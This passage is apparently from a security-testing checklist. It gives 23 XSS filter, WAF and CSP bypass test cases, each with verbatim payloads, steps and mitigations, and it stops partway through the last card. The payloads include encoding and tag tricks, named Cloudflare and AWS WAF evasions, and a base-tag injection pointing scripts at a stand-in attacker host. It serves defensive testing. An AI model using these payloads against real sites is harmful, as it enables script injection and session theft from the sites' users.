# WAF / Filter Bypass — Checklist

Expert per-attack **test-case matrix** for WAF / Filter Bypass — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*129 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## FILTER-001 — DOM-Based Input Manipulation
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** Client-Side Filter

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind Client-Side Filter

**How It Works:** Client-side JS filters input before sending to server; bypass by intercepting and modifying request after validation

**Detection Method:** Inspect page source for JS validation functions; check if validation runs in browser only

**Test Steps:** 1. Enter normal input and observe JS validation 2. Intercept request in Burp 3. Modify payload in intercepted request 4. Forward modified request

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Client-Side Filter and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
<script>alert(1)</script> (modified in Burp after client-side check passes)
```

**Why It Works:** Client-side validation only runs in browser; intercepting proxy bypasses it entirely

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** Implement server-side validation; never rely solely on client-side checks

**Tools:** Burp Suite, browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger Academy: DOM XSS, OWASP WSTG-CLNT-01

---

## FILTER-002 — Disabling JavaScript Validation
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** Client-Side Filter

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind Client-Side Filter

**How It Works:** Disable JS in browser to bypass client-side input validation

**Detection Method:** Check if form has onsubmit handlers or input event listeners

**Test Steps:** 1. Open browser DevTools 2. Disable JavaScript 3. Submit form with XSS payload directly 4. Check if payload reaches server

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Client-Side Filter and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
<img src=x onerror=alert(1)>
```

**Why It Works:** With JS disabled, no client-side filtering occurs and payload is sent raw

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** Server-side validation mandatory; client-side is UX only

**Tools:** Browser settings, NoScript addon

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); WAHH Chapter 5: Bypassing Client-Side Controls

---

## FILTER-003 — Case Variation Bypass
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind Server-Side Blacklist Filter

**How It Works:** Server filters lowercase keywords like 'script' but not mixed case

**Detection Method:** Submit &lt;script&gt; and observe if blocked; then try &lt;ScRiPt&gt;

**Test Steps:** 1. Send &lt;script&gt;alert(1)&lt;/script&gt; (blocked) 2. Send &lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt; 3. Observe if payload executes

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
<ScRiPt>alert(1)</ScRiPt>
```

**Why It Works:** Many regex filters use case-sensitive matching; mixed case evades the pattern

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** Use case-insensitive filtering; implement allowlisting instead of blocklisting

**Tools:** Burp Suite, manual testing

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PayloadsAllTheThings XSS Filter Evasion, OWASP XSS Filter Evasion Cheat Sheet

---

## FILTER-004 — Nested/Double Tag Bypass
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind Server-Side Blacklist Filter

**How It Works:** Server strips 'script' once but doesn't recurse; nested tag survives after stripping

**Detection Method:** Submit &lt;script&gt; (stripped to empty); then try &lt;scrscriptipt&gt;

**Test Steps:** 1. Confirm filter strips 'script' keyword 2. Nest the keyword so after one strip pass the remaining text forms valid tag 3. Submit nested payload

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
<scrscriptipt>alert(1)</scrscriptipt>
```

**Why It Works:** Filter removes 'script' once: &lt;scr[removed]ipt&gt; → &lt;script&gt; which then executes

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** Use recursive stripping or allowlist approach; sanitize with proven library

**Tools:** Burp Suite

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS Labs, WAHH Chapter 12

---

## FILTER-005 — Tag Attribute Event Handler Bypass
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind Server-Side Blacklist Filter

**How It Works:** &lt;script&gt; is blocked but other tags with event handlers are not

**Detection Method:** Test multiple HTML tags and event handlers systematically

**Test Steps:** 1. Confirm &lt;script&gt; is blocked 2. Try &lt;img src=x onerror=alert(1)&gt; 3. If img blocked try &lt;svg onload=alert(1)&gt; 4. Iterate through tags/events

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
<svg/onload=alert(1)> | <body onload=alert(1)> | <details open ontoggle=alert(1)> | <marquee onstart=alert(1)> | <video><source onerror=alert(1)>
```

**Why It Works:** Blacklist only blocks known tags; hundreds of HTML tags and event handlers exist that may not be in the list

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** Use allowlist of permitted tags; use DOMPurify or similar sanitization library

**Tools:** Burp Intruder with XSS tag/event wordlist, XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS Cheat Sheet (cheatsheet.portswigger.net)

---

## FILTER-006 — JavaScript Protocol in href/src
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind Server-Side Blacklist Filter

**How It Works:** Filter blocks script tags but allows href/src attributes with javascript: protocol

**Detection Method:** Check if &lt;a&gt; tags or other URL-accepting attributes are allowed

**Test Steps:** 1. Inject &lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt; 2. Try with HTML encoding: &lt;a href="&amp;#106;avascript:alert(1)"&gt;

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
<a href="javascript:alert(1)">click</a> | <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>
```

**Why It Works:** Filter doesn't check URL scheme in attributes; javascript: protocol executes JS when link is clicked

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** Validate URL schemes (allowlist http/https only); strip javascript: protocol

**Tools:** Burp Suite, manual

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); OWASP XSS Prevention Cheat Sheet

---

## FILTER-007 — HTML Entity Encoding Bypass
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind Server-Side Blacklist Filter

**How It Works:** Filter checks raw characters but not HTML entities that browser decodes

**Detection Method:** Submit raw payload (blocked) then HTML entity encoded version

**Test Steps:** 1. Send alert(1) with &lt;script&gt; (blocked) 2. Encode key characters as HTML entities 3. Browser decodes entities before execution

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)"> | <svg onload="&#x61;lert(1)">
```

**Why It Works:** Browser decodes HTML entities in attribute values before executing JavaScript; server filter sees encoded chars not keywords

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** Decode and normalize input before filtering; apply context-aware output encoding

**Tools:** Burp Decoder, CyberChef

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); OWASP XSS Filter Evasion, PayloadsAllTheThings

---

## FILTER-008 — Unicode Encoding Bypass
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind Server-Side Blacklist Filter

**How It Works:** Filter doesn't normalize Unicode; using Unicode escapes in JS contexts bypasses keyword detection

**Detection Method:** Test Unicode-encoded versions of blocked keywords

**Test Steps:** 1. Confirm 'alert' is blocked 2. Use Unicode escapes in JS context 3. Submit Unicode payload

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
<script>\u0061\u006c\u0065\u0072\u0074(1)</script> | <script>eval('\u0061lert(1)')</script>
```

**Why It Works:** JavaScript engine interprets Unicode escape sequences; filter sees \u0061 not 'a'

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** Normalize Unicode before filtering; use CSP to prevent inline scripts

**Tools:** Burp Suite, CyberChef

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PayloadsAllTheThings, PortSwigger

---

## FILTER-009 — Null Byte Injection
**Test Category:** XSS · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind Server-Side Blacklist Filter

**How It Works:** Insert null bytes to break filter pattern matching while payload still executes

**Detection Method:** Add %00 at various positions in payload and test

**Test Steps:** 1. Inject &lt;scr%00ipt&gt;alert(1)&lt;/script&gt; 2. Try &lt;script&gt;al%00ert(1)&lt;/script&gt; 3. Check if null byte terminates filter processing

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
<scr%00ipt>alert(1)</scr%00ipt> | <img src=x onerror=al%00ert(1)>
```

**Why It Works:** Some filters (especially C-based) treat null byte as string terminator; application/browser may ignore it

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** Strip null bytes from input; use binary-safe string functions

**Tools:** Burp Suite

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); WAHH Chapter 12, OWASP Testing Guide

---

## FILTER-010 — Tab/Newline/CR Injection in Tags
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind Server-Side Blacklist Filter

**How It Works:** Insert whitespace characters (tab newline carriage return) inside tag names or between attributes

**Detection Method:** Try adding %09 %0a %0d within tag structure

**Test Steps:** 1. Confirm &lt;script&gt; blocked 2. Try &lt;script%09&gt;alert(1)&lt;/script&gt; 3. Try &lt;script%0a&gt;alert(1)&lt;/script&gt; 4. Try &lt;img%0asrc=x%0aonerror=alert(1)&gt;

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
<script%09>alert(1)</script> | <img%0asrc=x%0aonerror=alert(1)> | <svg%0aonload=alert(1)>
```

**Why It Works:** HTML parsers are tolerant of whitespace in tags; regex filters often don't account for these characters between tag components

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** Normalize whitespace before filtering; use HTML parser-based sanitization not regex

**Tools:** Burp Suite

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); HTML5 spec parsing rules, PortSwigger

---

## FILTER-011 — Double URL Encoding
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** WAF (ModSecurity/Generic)

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind WAF (ModSecurity/Generic)

**How It Works:** WAF decodes URL once but application decodes twice; double encode payload

**Detection Method:** Submit single-encoded payload (blocked by WAF); try double-encoded

**Test Steps:** 1. Normal: &lt;script&gt; → blocked 2. Single encode: %3Cscript%3E → blocked 3. Double encode: %253Cscript%253E → passes WAF 4. App decodes to &lt;script&gt;

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF (ModSecurity/Generic) and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
%253Cscript%253Ealert(1)%253C/script%253E | %2522%253E%253Cscript%253Ealert(1)%253C/script%253E
```

**Why It Works:** WAF decodes first layer (%25 → %); passes %3Cscript%3E to app; app decodes second layer to &lt;script&gt;

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** WAF should recursively decode; application should not double-decode

**Tools:** Burp Suite, CyberChef

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); OWASP WAF Bypass, PayloadsAllTheThings

---

## FILTER-012 — Chunked Transfer Encoding Bypass
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** WAF (ModSecurity/Generic)

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind WAF (ModSecurity/Generic)

**How It Works:** Split payload across multiple chunks so WAF cannot reassemble and match signature

**Detection Method:** Test if WAF inspects chunked requests differently

**Test Steps:** 1. Convert request to chunked Transfer-Encoding 2. Split XSS payload across chunk boundaries 3. Send and observe if WAF misses it

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF (ModSecurity/Generic) and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
Transfer-Encoding: chunked\r\n\r\n3\r\n<sc\r\n4\r\nript\r\n1\r\n>\r\n...
```

**Why It Works:** Many WAFs inspect each chunk independently; payload signature spans multiple chunks and is not detected

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** WAF should reassemble chunks before inspection; inspect complete request body

**Tools:** Burp Suite, custom Python script

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); WAF Bypass Techniques research papers, soroush.secproject.com

---

## FILTER-013 — HTTP Parameter Pollution
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** WAF (ModSecurity/Generic)

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind WAF (ModSecurity/Generic)

**How It Works:** Send same parameter multiple times; WAF checks one occurrence but app uses another

**Detection Method:** Test HPP behavior: send param=safe&amp;param=malicious

**Test Steps:** 1. Send ?search=safe&amp;search=&lt;script&gt;alert(1)&lt;/script&gt; 2. Observe which value WAF inspects vs which app processes 3. Try different positions

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF (ModSecurity/Generic) and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
?search=safe&search=<script>alert(1)</script> | POST: search=safe&search=<script>alert(1)</script>
```

**Why It Works:** Different servers handle duplicate params differently (first/last/concatenated); WAF may check first while app uses last

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** WAF should inspect all parameter occurrences; application should reject duplicate parameters

**Tools:** Burp Suite, ParamMiner

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); OWASP HPP, Luca Carettoni &amp; Stefano di Paola research

---

## FILTER-014 — Cloudflare WAF Bypass - Exotic Tags
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** WAF (CloudFlare)

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind WAF (CloudFlare)

**How It Works:** Use obscure HTML tags and events not in Cloudflare's signature database

**Detection Method:** Test uncommon HTML5 tags with event handlers

**Test Steps:** 1. Try common payloads (blocked) 2. Use PortSwigger XSS cheat sheet tags 3. Test &lt;details/open/ontoggle=alert(1)&gt; 4. Test &lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;img src onerror=alert(1)&gt;

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF (CloudFlare) and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
<svg><animate onbegin=alert(1) attributeName=x dur=1s> | <math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)> | <xss id=x onfocus=alert(1) tabindex=1>
```

**Why It Works:** Cloudflare uses signature-based detection; new/obscure tags not in signatures pass through

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** Keep WAF rules updated; implement CSP; use server-side sanitization as primary defense

**Tools:** Burp Suite, XSS cheat sheet generator

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS Cheat Sheet, Cloudflare bypass research

---

## FILTER-015 — Cloudflare Bypass via Content-Type Manipulation
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** WAF (CloudFlare)

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind WAF (CloudFlare)

**How It Works:** Change Content-Type header to confuse WAF about how to parse body

**Detection Method:** Try alternate Content-Type values

**Test Steps:** 1. Normal POST with application/x-www-form-urlencoded (blocked) 2. Change to multipart/form-data 3. Change to text/plain 4. Change to application/json

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF (CloudFlare) and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
Content-Type: multipart/form-data; boundary=abc\r\n\r\n--abc\r\nContent-Disposition: form-data; name="param"\r\n\r\n<script>alert(1)</script>\r\n--abc--
```

**Why It Works:** WAF may only inspect specific Content-Types; switching types may cause WAF to skip inspection while app still processes

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** WAF should inspect all Content-Types; normalize before inspection

**Tools:** Burp Suite

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); WAF bypass research, Bug bounty writeups on HackerOne

---

## FILTER-016 — AWS WAF Bypass - Unicode Normalization
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** WAF (AWS WAF)

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind WAF (AWS WAF)

**How It Works:** Use Unicode characters that normalize to ASCII equivalents after WAF inspection

**Detection Method:** Test Unicode fullwidth characters and other Unicode tricks

**Test Steps:** 1. Try normal payload (blocked) 2. Replace ASCII chars with Unicode fullwidth equivalents 3. Submit and check if app normalizes to ASCII

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF (AWS WAF) and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
＜script＞alert(1)＜/script＞ (fullwidth) | <script>alert\uff081\uff09</script>
```

**Why It Works:** AWS WAF inspects raw bytes; application may normalize Unicode fullwidth to ASCII equivalents

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** WAF should normalize Unicode before inspection; app should not auto-normalize untrusted Unicode

**Tools:** Burp Suite, CyberChef

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); Unicode Security considerations (unicode.org), AWS WAF bypass research

---

## FILTER-017 — Payload Fragmentation via Multiple Parameters
**Test Category:** XSS · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Security Control Bypassed:** WAF (Generic)

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind WAF (Generic)

**How It Works:** Split XSS payload across multiple parameters that get concatenated server-side

**Detection Method:** Identify if multiple parameters are reflected/concatenated in response

**Test Steps:** 1. Find two+ params reflected adjacently 2. Split payload across them: param1=&lt;script&gt; param2=alert(1)&lt;/script&gt; 3. Check if concatenated in output

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF (Generic) and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
param1=">&param2=<script>&param3=alert(1)&param4=</script>
```

**Why It Works:** WAF inspects each parameter independently; neither contains complete malicious pattern; app concatenates them in output

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** WAF should inspect concatenated output context; app should encode each parameter independently

**Tools:** Burp Suite, manual

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger research, WAHH Chapter 12

---

## FILTER-018 — CSP Bypass - Unsafe Eval
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** CSP (Content Security Policy)

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind CSP (Content Security Policy)

**How It Works:** If CSP allows 'unsafe-eval' directive; use eval() setTimeout() or Function() for XSS

**Detection Method:** Check CSP header for 'unsafe-eval' keyword

**Test Steps:** 1. Read Content-Security-Policy response header 2. Check for 'unsafe-eval' in script-src 3. If present craft payload using eval()

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades CSP (Content Security Policy) and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
<div onmouseover="eval('ale'+'rt(1)')"> | <img src=x onerror="setTimeout('alert(1)');">
```

**Why It Works:** 'unsafe-eval' explicitly allows dynamic code execution; eval/setTimeout/Function all work

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** Remove 'unsafe-eval' from CSP; use strict CSP with nonces/hashes

**Tools:** Browser DevTools, CSP Evaluator (csp-evaluator.withgoogle.com)

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger CSP Bypass, OWASP CSP Cheat Sheet

---

## FILTER-019 — CSP Bypass - Unsafe Inline
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** CSP (Content Security Policy)

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind CSP (Content Security Policy)

**How It Works:** If CSP allows 'unsafe-inline'; inline scripts and event handlers work

**Detection Method:** Check CSP header for 'unsafe-inline' keyword

**Test Steps:** 1. Read CSP header 2. If 'unsafe-inline' present in script-src 3. Use inline event handlers or &lt;script&gt; blocks

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades CSP (Content Security Policy) and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
<script>alert(1)</script> | <img src=x onerror=alert(1)>
```

**Why It Works:** 'unsafe-inline' defeats the purpose of CSP for XSS prevention; all inline scripts allowed

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** Use nonce-based or hash-based CSP instead of 'unsafe-inline'

**Tools:** Browser DevTools, CSP Evaluator

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); Google CSP research, PortSwigger

---

## FILTER-020 — CSP Bypass - Whitelisted Domain with JSONP
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** CSP (Content Security Policy)

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind CSP (Content Security Policy)

**How It Works:** If CSP whitelists a domain that has a JSONP endpoint; use it to execute arbitrary JS

**Detection Method:** Find JSONP endpoints on CSP-whitelisted domains

**Test Steps:** 1. Extract whitelisted domains from CSP 2. Find JSONP endpoints on those domains (Google APIs/CDN etc.) 3. Craft script src pointing to JSONP with callback=alert

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades CSP (Content Security Policy) and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
<script src="https://whitelisted-cdn.com/jsonp?callback=alert(1)//\"></script> | <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
```

**Why It Works:** CSP trusts the whitelisted domain; JSONP endpoint reflects callback parameter as executable JavaScript

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** Use strict-dynamic CSP; avoid whitelisting entire domains; use nonces

**Tools:** CSP Evaluator, JSONBee (github.com/zigoo0/JSONBee)

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); Sebastian Lekies CSP research, PortSwigger

---

## FILTER-021 — CSP Bypass - Base URI Injection
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** CSP (Content Security Policy)

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind CSP (Content Security Policy)

**How It Works:** If CSP doesn't restrict base-uri; inject &lt;base&gt; tag to hijack relative script URLs

**Detection Method:** Check if base-uri is missing from CSP

**Test Steps:** 1. Verify base-uri not in CSP 2. Inject &lt;base href="https://attacker.com/"&gt; 3. Page's relative script src (src="app.js") now loads from attacker domain

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades CSP (Content Security Policy) and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
<base href="https://attacker.com/">
```

**Why It Works:** Without base-uri restriction; &lt;base&gt; tag changes the base URL for all relative URLs including script sources

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** Add base-uri 'self' or base-uri 'none' to CSP

**Tools:** Burp Suite, browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger CSP labs, Gareth Heyes research

---

## FILTER-022 — CSP Bypass - Script Nonce Leak/Reuse
**Test Category:** XSS · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Security Control Bypassed:** CSP (Content Security Policy)

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind CSP (Content Security Policy)

**How It Works:** If CSP nonce is predictable; static; or leaked in response; use it in injected script

**Detection Method:** Check if nonce changes per request; search for nonce value in response body

**Test Steps:** 1. Make multiple requests and compare nonce values 2. Search response body/DOM for nonce value 3. If static or predictable use in payload

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades CSP (Content Security Policy) and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
<script nonce="leaked-nonce-value">alert(1)</script>
```

**Why It Works:** If nonce doesn't change per request or is leaked elsewhere in the page; attacker can include valid nonce in payload

**Impact:** Filter/WAF bypass enabling XSS — script executes in the victim's browser (session/token theft, account actions)

**Mitigation:** Generate cryptographically random nonce per request; never expose nonce in cacheable content

**Tools:** Burp Suite, browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger, W3C CSP spec

---

## FILTER-023 — CSP Bypass via CDN Hosted Libraries
**Test Category:** XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** CSP (Content Security Policy)

**Where to Test / Injection Point:** XSS sink (reflected/stored/DOM) — behind CSP (Content Security Policy)

**How It Works:** Use whitelisted CDN to load Angular/Vue/React that enables template injection XSS

**Detection Method:** Check if popular CDN (cdnjs/jsdelivr) is whitelisted in CSP

**Test Steps:** 1. Check CSP whitelist for CDN domains 2. Load AngularJS from whitelisted CDN 3. Use Angular template injection for XSS

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades CSP (Content Security Policy) and reaches the sink — script executes in the victim's browser (session/token theft, account actions)

**Payload Example:**

```
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

